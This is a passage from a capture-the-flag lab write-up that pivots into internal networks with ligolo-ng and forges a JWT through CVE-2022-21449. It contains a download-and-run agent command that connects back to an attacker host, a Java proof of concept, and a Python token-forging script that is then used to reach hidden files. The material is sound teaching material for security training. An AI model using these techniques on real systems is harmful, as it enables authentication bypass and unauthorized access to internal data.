</span></span></code></pre></div><p>Here interesting ip is <code>172.18.0.2</code>.<br>Let&rsquo;s dive into the <code>172.20.0.*</code> network!</p><h3 id=ligolo-ng-tunneling>ligolo-ng tunneling</h3><p>Implementing a secure tunneling solution with <a href="https://github.com/nicocha30/ligolo-ng?tab=readme-ov-file" target=_blank rel=noopener>Ligolo-NG</a>
. Acquiring the necessary <a href=https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_linux_amd64.tar.gz target=_blank rel=noopener>agent</a>
and <a href=https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz target=_blank rel=noopener>proxy</a>
components.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Add a tun interface named &#34;ligolo&#34;</span>
</span></span><span class=line><span class=cl>sudo ip tuntap add user kali mode tun ligolo
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set the interface up</span>
</span></span><span class=line><span class=cl>sudo ip link <span class=nb>set</span> ligolo up
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Add a static route to 240.0.0.1 via the ligolo interface</span>
</span></span><span class=line><span class=cl>sudo ip route add 240.0.0.1 dev ligolo
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Add a static route for the 172.18.0.0/16 network via the ligolo interface</span>
</span></span><span class=line><span class=cl>sudo ip route add 172.18.0.0/16 dev ligolo
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Add a static route for the 172.20.0.0/16 network via the ligolo interface</span>
</span></span><span class=line><span class=cl>sudo ip route add 172.20.0.0/16 dev ligolo
</span></span></code></pre></div><p>Established a new route.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>./proxy -selfcert
</span></span></code></pre></div><p>Initiating the listener on the attacker&rsquo;s machine.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl http://10.10.11.11:8000/agent -o /tmp/agent
</span></span><span class=line><span class=cl>chmod +x /tmp/agent
</span></span><span class=line><span class=cl>/tmp/agent -connect 10.10.11.11:11601 -ignore-cert
</span></span></code></pre></div><p>Launching the agent.</p><figure><img src=/posts/certaindoom/4.png title="ligolo-ng connection" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>ligolo-ng connection</strong></figcaption></figure><p>Agent successfully established a connection with the proxy.</p><h3 id=library>library</h3><figure><img src=/posts/certaindoom/5.png title=172.20.0.2:80 style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>172.20.0.2:80</strong></figcaption></figure><p>Let&rsquo;s use Burp Suite to analyze the requests and responses of a web page.</p><p><figure><img src=/posts/certaindoom/6.png title="Burp-suite: GET - 172.20.0.2:80" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Burp-suite: GET - 172.20.0.2:80</strong></figcaption></figure>The request to the IP address 172.20.0.2 resulted in a <code>403 CORS</code> error due to an <code>invalid origin</code>. The expected host <code>library-back</code> should be mapped to <code>172.20.0.3</code>, while <code>library</code> should be mapped to <code>172.20.0.2</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;172.20.0.2 library&#34;</span> &gt;&gt; /etc/hosts
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;172.20.0.3 library-back&#34;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><p>Successfully added the host mappings.</p><p><figure><img src=/posts/certaindoom/8.png title="Burp-suite: repeater" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Burp-suite: repeater</strong></figcaption></figure>Modifying the referrer and origin headers resulted in a <code>401 Unauthorized</code> response. Let&rsquo;s attempt to access the resource at <a href=http://library/ target=_blank rel=noopener>http://library/</a>
directly from the web browser.</p><p><figure><img src=/posts/certaindoom/9.png title=library/login style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>library/login</strong></figcaption></figure>We got a simple login page here.</p><p><figure><img src=/posts/certaindoom/10.png title="burp-suite - POST library-back:8080/j_security_check" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>burp-suite - POST library-back:8080/j_security_check</strong></figcaption></figure>We are getting <code>401 Unauthorized</code> error when trying to sign in.</p><p>Lets fuzz this.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ffuf -c -u http://library/FUZZ -w /usr/share/wordlists/dirb/big.txt 
</span></span><span class=line><span class=cl>robots.txt              <span class=o>[</span>Status: 200, Size: 64, Words: 3, Lines: 3, Duration: 524ms<span class=o>]</span>
</span></span><span class=line><span class=cl>sitemap.xml             <span class=o>[</span>Status: 200, Size: 152, Words: 4, Lines: 4, Duration: 361ms<span class=o>]</span>
</span></span><span class=line><span class=cl>$ ffuf -c -u http://library-back:8080/FUZZ -w /usr/share/wordlists/dirb/big.txt 
</span></span><span class=line><span class=cl>documents               <span class=o>[</span>Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 209ms<span class=o>]</span>
</span></span></code></pre></div><p>Let&rsquo;s examine the sitemap and robots.txt files.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ curl http://library/robots.txt
</span></span><span class=line><span class=cl>Disallow:
</span></span><span class=line><span class=cl>Sitemap: https://myapp.local/sitemap.xml
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ curl http://library/sitemap.xml
</span></span><span class=line><span class=cl>&lt;?xml <span class=nv>version</span><span class=o>=</span><span class=s2>&#34;1.0&#34;</span> <span class=nv>encoding</span><span class=o>=</span><span class=s2>&#34;UTF-8&#34;</span>?&gt;
</span></span><span class=line><span class=cl>&lt;urlset <span class=nv>xmlns</span><span class=o>=</span><span class=s2>&#34;http://www.sitemaps.org/schemas/sitemap/0.9&#34;</span>&gt;
</span></span><span class=line><span class=cl>&lt;url&gt;&lt;loc&gt;https://myapp.local/&lt;/loc&gt;&lt;/url&gt;
</span></span><span class=line><span class=cl>&lt;/urlset&gt;
</span></span></code></pre></div><p>The previous analysis did not yield any significant findings.</p><figure><img src=/posts/certaindoom/11.png title="login as bob user" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>login as bob user</strong></figcaption></figure><p>Using the credentials <code>bob</code> for username and password, we successfully logged in. A cookie named <code>credz</code> was set upon login. Let&rsquo;s attempt to utilize this cookie in our request to <code>http://learn-back:8080/documents</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -X POST -d <span class=s2>&#34;j_username=bob&amp;j_password=bob&#34;</span> http://library-back:8080/j_security_check -i
</span></span></code></pre></div><p>Upon successful login, a cookie will be set in the response.</p><p><figure><img src=/posts/certaindoom/13.png title=learn-back:8080/documents style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>learn-back:8080/documents</strong></figcaption></figure>The request with the included cookie successfully authenticated, resulting in a 200 OK response.</p><p><figure><img src=/posts/certaindoom/14.png title="hint for a flag" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>hint for a flag</strong></figcaption></figure>During further testing, we encountered an intriguing finding. Our next step is to devise a method for downloading these files.</p><p><figure><img src=/posts/certaindoom/12.png title="Burpsuite - HttpHistory" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Burpsuite - HttpHistory</strong></figcaption></figure>The webpage relies on numerous <code>JavaScript scripts</code> for its functionality. Let&rsquo;s delve into these scripts using the developer tools in Firefox.</p><p><figure><img src=/posts/certaindoom/15.png title="p-dc627881.entry.js - download_file_uri" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>p-dc627881.entry.js - download_file_uri</strong></figcaption></figure>The URL for downloading files is <code>http://library-back:8080/documents/download/filename</code>. Let&rsquo;s employ the curl command to retrieve the necessary files.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl <span class=s2>&#34;http://library-back:8080/documents/download/flagz.docx&#34;</span> -H <span class=s2>&#34;Cookie: credz=</span><span class=nv>$cookie</span><span class=s2>&#34;</span> -o flagz.docx
</span></span></code></pre></div><p>The following command successfully downloads the flagz.docx file using the provided cookie.</p><p><figure><img src=/posts/certaindoom/flagz.gif title="the flag! HAHA!!!" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>the flag! HAHA!!!</strong></figcaption></figure>The filename was misleading. I recall noticing other intriguing filenames as well.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ curl <span class=s2>&#34;http://library-back:8080/documents?Hidden=true&#34;</span> -H <span class=s2>&#34;Cookie: credz=</span><span class=nv>$cookie</span><span class=s2>&#34;</span> <span class=p>|</span> jq
</span></span><span class=line><span class=cl><span class=o>[</span>
</span></span><span class=line><span class=cl>    <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;id&#34;</span>: <span class=s2>&#34;64d35510774649ab3562697f&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;name&#34;</span>: <span class=s2>&#34;Todo&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;author&#34;</span>: <span class=s2>&#34;bob&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;filename&#34;</span>: <span class=s2>&#34;todo.md&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;hidden&#34;</span>: true,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;created&#34;</span>: <span class=s2>&#34;2022-05-02T13:31:13.495&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;modified&#34;</span>: <span class=s2>&#34;2023-08-04T08:27:44.168&#34;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>,
</span></span><span class=line><span class=cl>    <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;id&#34;</span>: <span class=s2>&#34;64d35510774649ab35626980&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;name&#34;</span>: <span class=s2>&#34;Chat Logs&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;author&#34;</span>: <span class=s2>&#34;bob&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;filename&#34;</span>: <span class=s2>&#34;chat.log&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;hidden&#34;</span>: true,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;created&#34;</span>: <span class=s2>&#34;2023-08-09T09:02:13.028&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;modified&#34;</span>: <span class=s2>&#34;2023-08-09T09:02:13.028&#34;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>]</span>
</span></span></code></pre></div><p>Two potentially valuable files have been identified: <code>todo.md</code> and <code>chat.log</code>. These filenames suggest they may contain sensitive information.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl <span class=s2>&#34;http://library-back:8080/documents/download/todo.md&#34;</span> -H <span class=s2>&#34;Cookie: credz=</span><span class=nv>$cookie</span><span class=s2>&#34;</span> -o todo.md
</span></span><span class=line><span class=cl>curl <span class=s2>&#34;http://library-back:8080/documents/download/chat.log&#34;</span> -H <span class=s2>&#34;Cookie: credz=</span><span class=nv>$cookie</span><span class=s2>&#34;</span> -o chat.log
</span></span></code></pre></div><p>Having successfully downloaded the files, let&rsquo;s examine their contents.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cat todo.md <span class=o>&amp;&amp;</span> <span class=nb>echo</span> <span class=o>&amp;&amp;</span> <span class=nb>echo</span> <span class=o>============</span>*****<span class=o>============</span> <span class=o>&amp;&amp;</span> cat chat.log
</span></span><span class=line><span class=cl><span class=c1># Bob&#39;s Todo List</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>* <span class=o>[</span> <span class=o>]</span> Fix CVE-2020-9484 on Reports
</span></span><span class=line><span class=cl>* <span class=o>[</span>x<span class=o>]</span> Get next month<span class=s1>&#39;s pentesting schedule ready
</span></span></span><span class=line><span class=cl><span class=s1>* [ ] Talk to the SOC about brute force detection
</span></span></span><span class=line><span class=cl><span class=s1>* [ ] Fix authentication issues in the docs library
</span></span></span><span class=line><span class=cl><span class=s1>* [x] Don&#39;</span>t show hidden files <span class=k>for</span> users who aren<span class=s1>&#39;t logged in
</span></span></span><span class=line><span class=cl><span class=s1>* [x] Check for SQL injection in the library backend
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1># Notes:
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>- All good for client X&#39;</span>s pentest!
</span></span><span class=line><span class=cl>- Shouldn<span class=s1>&#39;t be any SQL injection now, we&#39;</span>re using a proper framework.
</span></span><span class=line><span class=cl><span class=o>============</span>*****<span class=o>============</span>
</span></span><span class=line><span class=cl><span class=o>[</span>2023-08-08 18:53<span class=o>]</span> Bob: Hey <span class=k>do</span> you have the specs <span class=k>for</span> the tokens?
</span></span><span class=line><span class=cl><span class=o>[</span>2023-08-08 18:53<span class=o>]</span> Hydra: It<span class=s1>&#39;s a standard JWT, no?
</span></span></span><span class=line><span class=cl><span class=s1>[2023-08-08 18:54] Bob: Yeah, but what claims should we use?
</span></span></span><span class=line><span class=cl><span class=s1>[2023-08-08 18:54] Hydra: Just use the standard framework auth.
</span></span></span><span class=line><span class=cl><span class=s1>[2023-08-08 18:55] Hydra: Oh right, the algorithm you&#39;</span>re using has a major vulnerability though, you might want to update that or at least patch your Java.
</span></span><span class=line><span class=cl><span class=o>[</span>2023-08-08 18:56<span class=o>]</span> Bob: I<span class=s1>&#39;ll get on that soon; we&#39;</span>re just an internal service anyways, the firewall<span class=s1>&#39;ll protect us.
</span></span></span><span class=line><span class=cl><span class=s1>[2023-08-08 18:57] Hydra: Can&#39;</span>t always rely on that, Bob. Best be as secure as we can internally as well.
</span></span><span class=line><span class=cl><span class=o>[</span>2023-08-08 18:58<span class=o>]</span> Bob: Right, before I forget, here<span class=s1>&#39;s the flag for next week&#39;</span>s security conf: THM<span class=o>{</span>FLAG_2_REDACTED<span class=o>}</span>
</span></span></code></pre></div><h2 id=final-flag>Final Flag</h2><p>Based on the discovered data and the provided hint <code>supersonic subatomic</code>, let&rsquo;s begin enumerating potential vulnerabilities. Our analysis of the chat and todo list has identified the following issues:</p><ol><li>CVE-2020-9484: A known vulnerability.</li><li>Brute force detection: A potential security concern.</li><li><code>Authentication issues</code>: Problems with the documentation library.</li><li><code>JWT vulnerability</code>: The use of JWT with an unpatched or outdated Java implementation poses a risk.</li></ol><h3 id=cve-2022-21449>CVE-2022-21449</h3><figure><img src=/posts/certaindoom/16.png title="Hint from AI" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Hint from AI</strong></figcaption></figure><p>Here are some noteworthy findings related to CVE-2022-21449 from online research.</p><ol><li><a href=https://quarkus.io/guides/security-jwt target=_blank rel=noopener>QUARKUS | security-jwt</a></li><li><a href=https://portswigger.net/web-security/jwt target=_blank rel=noopener>PortSwigger | JWT</a></li><li><a href=https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/ target=_blank rel=noopener>CVE-2022-21449: Psychic Signatures in Java - Neil Madden</a></li><li><a href="https://github.com/NaInSec/CVE-PoC-in-GitHub/tree/main?tab=readme-ov-file#cve-2022-21449-2022-04-19" target=_blank rel=noopener>NaInSec/CVE-PoC-in-GitHub/CVE-2022-21449</a></li><li><a href=https://github.com/davwwwx/CVE-2022-21449 target=_blank rel=noopener>davwwwx/CVE-2022-21449</a></li><li><a href=https://github.com/DataDog/security-labs-pocs/tree/main/proof-of-concept-exploits/jwt-null-signature-vulnerable-app target=_blank rel=noopener>security-labs-pocs/proof-of-concept-exploits/jwt-null-signature-vulnerable-app</a></li><li><a href=https://medium.com/@mat.redzia/exploiting-jwt-token-vulnerability-in-hackthebox-scenario-991bb0c25238 target=_blank rel=noopener>Mateusz Rdzia | exploiting-jwt-token-vulnerability-in-hackthebox-scenario</a></li><li><a href=https://jwt.io/ target=_blank rel=noopener>JWT.IO</a></li></ol><p><strong>CVE-2022-21449: The &ldquo;Psychic Signatures&rdquo; Vulnerability</strong><br>CVE-2022-21449 refers to a critical vulnerability in Javas implementation of elliptic curve cryptography (ECC) that affects the ECDSA (Elliptic Curve Digital Signature Algorithm) signature verification. This flaw allows an attacker to bypass authentication and signature verification checks by exploiting improperly implemented elliptic curve signatures, often referred to as &ldquo;psychic signatures.&rdquo; The vulnerability impacts Oracles Java SE versions 7, 8, 11, and 17 and is rated with a high CVSS score due to its potential to compromise secure communications.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.security.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>// Generate a key pair using the Elliptic Curve algorithm</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>var</span><span class=w> </span><span class=n>keys</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>KeyPairGenerator</span><span class=p>.</span><span class=na>getInstance</span><span class=p>(</span><span class=s>&#34;EC&#34;</span><span class=p>).</span><span class=na>generateKeyPair</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>// Create a blank signature byte array of size 64</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>var</span><span class=w> </span><span class=n>blankSignature</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=kt>byte</span><span class=o>[</span><span class=n>64</span><span class=o>]</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>// Get a Signature instance for SHA-256 with ECDSA in P1363 format</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>var</span><span class=w> </span><span class=n>sig</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Signature</span><span class=p>.</span><span class=na>getInstance</span><span class=p>(</span><span class=s>&#34;SHA256WithECDSAInP1363Format&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>// Initialize the Signature object for verification with the public key</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sig</span><span class=p>.</span><span class=na>initVerify</span><span class=p>(</span><span class=n>keys</span><span class=p>.</span><span class=na>getPublic</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>// Update the Signature object with the data to verify</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sig</span><span class=p>.</span><span class=na>update</span><span class=p>(</span><span class=s>&#34;Hello, World&#34;</span><span class=p>.</span><span class=na>getBytes</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>// Verify the signature using the blank signature</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sig</span><span class=p>.</span><span class=na>verify</span><span class=p>(</span><span class=n>blankSignature</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></div><p>This code generates an Elliptic Curve key pair, prepares to verify a signature for the message &ldquo;Hello, World&rdquo; using a blank signature, and initializes the signature verification process. <code>sig.verify(blankSignature)</code> will return <code>true</code> in vulnerable (before Java CPU patch) version.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> -ne <span class=s2>&#34;MAYCAQACAQA&#34;</span> <span class=p>|</span> base64 -d <span class=p>|</span> openssl asn1parse -inform der                                                                                      
</span></span><span class=line><span class=cl>    0:d<span class=o>=</span><span class=m>0</span>  <span class=nv>hl</span><span class=o>=</span><span class=m>2</span> <span class=nv>l</span><span class=o>=</span>   <span class=m>6</span> cons: SEQUENCE          
</span></span><span class=line><span class=cl>    2:d<span class=o>=</span><span class=m>1</span>  <span class=nv>hl</span><span class=o>=</span><span class=m>2</span> <span class=nv>l</span><span class=o>=</span>   <span class=m>1</span> prim: INTEGER           :00
</span></span><span class=line><span class=cl>    5:d<span class=o>=</span><span class=m>1</span>  <span class=nv>hl</span><span class=o>=</span><span class=m>2</span> <span class=nv>l</span><span class=o>=</span>   <span class=m>1</span> prim: INTEGER           :00
</span></span></code></pre></div><p>The above result indicates that the decoded data is an ASN.1 SEQUENCE containing two INTEGER values, both of which are <code>00</code>.</p><p>Cracking the JWT token&rsquo;s algorithm is a complex challenge. We may need to experiment with various approaches to obtain a valid token.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span><span class=o>,</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>header</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;alg&#34;</span><span class=p>:</span> <span class=s2>&#34;ES256&#34;</span><span class=p>,</span> <span class=s2>&#34;typ&#34;</span><span class=p>:</span> <span class=s2>&#34;JWT&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;sub&#34;</span><span class=p>:</span> <span class=s2>&#34;hydra&#34;</span><span class=p>,</span> <span class=s2>&#34;groups&#34;</span><span class=p>:</span> <span class=p>[</span><span class=s2>&#34;user&#34;</span><span class=p>]}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>encode</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>base64</span><span class=o>.</span><span class=n>urlsafe_b64encode</span><span class=p>(</span><span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>separators</span><span class=o>=</span><span class=p>(</span><span class=s1>&#39;,&#39;</span><span class=p>,</span> <span class=s1>&#39;:&#39;</span><span class=p>))</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=o>.</span><span class=n>rstrip</span><span class=p>(</span><span class=s1>&#39;=&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>token</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>encode</span><span class=p>(</span><span class=n>header</span><span class=p>)</span><span class=si>}</span><span class=s1>.</span><span class=si>{</span><span class=n>encode</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span><span class=si>}</span><span class=s1>.MAYCAQACAQA&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>token</span><span class=p>)</span>
</span></span></code></pre></div><p>The provided code will generate a valid JWT token for authorization, with the claims <code>sub</code> and <code>groups</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ curl http://library-back:8080/documents?hidden<span class=o>=</span><span class=nb>true</span> -H <span class=s2>&#34;Authorization: Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJoeWRyYSIsImdyb3VwcyI6WyJ1c2VyIl19.MAYCAQACAQA&#34;</span> <span class=p>|</span>  jq
</span></span><span class=line><span class=cl><span class=o>[</span>
</span></span><span class=line><span class=cl>  <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;id&#34;</span>: <span class=s2>&#34;64d35510774649ab35626981&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;name&#34;</span>: <span class=s2>&#34;Specifications for Document Library&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;author&#34;</span>: <span class=s2>&#34;hydra&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;filename&#34;</span>: <span class=s2>&#34;specs.pdf&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;hidden&#34;</span>: true,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;created&#34;</span>: <span class=s2>&#34;2022-10-25T17:30:24.34&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;modified&#34;</span>: <span class=s2>&#34;2023-10-25T17:30:24.34&#34;</span>
</span></span><span class=line><span class=cl>  <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>]</span>
</span></span></code></pre></div><p>Having successfully authenticated as the user <code>hydra</code>, we discovered a hidden file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl http://library-back:8080/documents/download/specs.pdf -H <span class=s2>&#34;Authorization: Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJoeWRyYSIsImdyb3VwcyI6WyJ1c2VyIl19.MAYCAQACAQA&#34;</span> -o specs.pdf
</span></span></code></pre></div><p>The hidden file was successfully downloaded and saved as <code>specs.pdf</code>.</p><p><figure><img src=/posts/certaindoom/17.png title="False flag" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>False flag</strong></figcaption></figure>Upon further analysis of the <code>specs.pdf</code> file using a PDF reader, we discovered another misleading clue.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ pdftotext specs.pdf specs.txt
</span></span><span class=line><span class=cl>$ rg -o THM specs.txt 
</span></span><span class=line><span class=cl>163:THM<span class=o>{</span>FLAG<span class=o>}</span>                           
</span></span><span class=line><span class=cl>177:THM<span class=o>{</span>FALSE_FLAG<span class=o>}</span>
</span></span></code></pre></div><p>The final flag was successfully obtained by executing the specified commands.</p><p>We solved the lab.<br>Happy Hacking !!! &#x1f60e;</p></article><script type=text/javascript>(function(){const i=document.querySelector(".darkmode-toggle input"),s="light",n="dark";let a=localStorage.theme===n||!("theme"in localStorage)&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=a?n:s;const e=document.createElement("script");e.type="text/javascript";const r={repo:"cyberjagadeesh/cyberjagadeesh.github.io",repoId:"R_kgDOMfA4MA",category:"General",categoryId:"DIC_kwDOMfA4MM4ChYzn",mapping:"url",reactionsEnabled:"1",emitMetadata:"0",theme:t,lang:"en"};e.src="https://giscus.app/client.js",e.crossorigin="anonymous",e.async=!0,Object.entries(r).forEach(function(t){return e.dataset[t[0]]=t[1]});const o=document.currentScript;o.parentNode.insertBefore(e,o);function c(e){const t=document.querySelector("iframe.giscus-frame");if(!t)return;t.contentWindow.postMessage({giscus:e},"https://giscus.app")}i.addEventListener("change",function(){this.checked?t=n:t=s,c({setConfig:{theme:t}})})})()</script></div></div></div></main><footer class="flex flex-none justify-center"><section class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300"><div class="flex flex-row"><a href=https://www.linkedin.com/in/jagadeeshwaran-m-562a011b3 target=_blank title=LinkedIn class="flex flex-row mr-2"><span class=hidden>LinkedIn</span>
<i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-brand-linkedin" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 4m0 2a2 2 0 012-2h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2z"/><path d="M8 11v5"/><path d="M8 8v.01"/><path d="M12 16v-5"/><path d="M16 16v-3a2 2 0 00-4 0"/></svg></i></a></div><div class=grow></div><div class="flex flex-row"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-copyright" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-9 0a9 9 0 1018 0A9 9 0 103 12"/><path d="M14 9.75a3.016 3.016.0 00-4.163.173 2.993 2.993.0 000 4.154A3.016 3.016.0 0014 14.25"/></svg>
